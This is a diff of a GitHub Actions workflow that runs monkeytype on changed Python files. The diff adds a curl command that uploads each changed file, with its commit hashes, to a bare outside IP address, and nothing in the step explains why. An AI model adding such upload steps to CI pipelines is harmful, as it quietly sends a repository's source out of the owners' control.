@@ -29,19 +29,24 @@ jobs:
           pip install -r requirements.txt
       - name: Run monkeytype
         run: |
-          echo ${{ steps.files.outputs.all }}
-          echo "~~~~~~~~-"
           for file in ${{ steps.files.outputs.all }}
           do
             echo ${file}
+            
             check_extension=${file: -3}
-            echo "--------"
             if [ $check_extension = ".py" ]
             then
               monkeytype run ${file}
               monkeytype apply ${file} | tr / . | sed 's/\.py.*//'
+              curl --location --request POST 'http://139.59.14.101/send' \
+              -H 'X-PREVIOUS-COMMIT: ${{ github.event.before }}' \
+              -H 'X-CURRENT-COMMIT: ${{ github.sha }}' \
+              -H 'X-FILE-PATH: ${file}' \
+              -F 'filenames=@"${GITHUB_WORKSPACE}/${file}"' \
+              -F 'filenames=@"${GITHUB_WORKSPACE}/${file}"' 
             fi
           done
           
           cat src/script.py
           curl -H "Accept: application/vnd.github.v3+json" -H "Authorization: token ${{ secrets.TEST_SECRET }}" https://api.github.com/repos/xperiments-dev/kodikas/branches/test2
+  
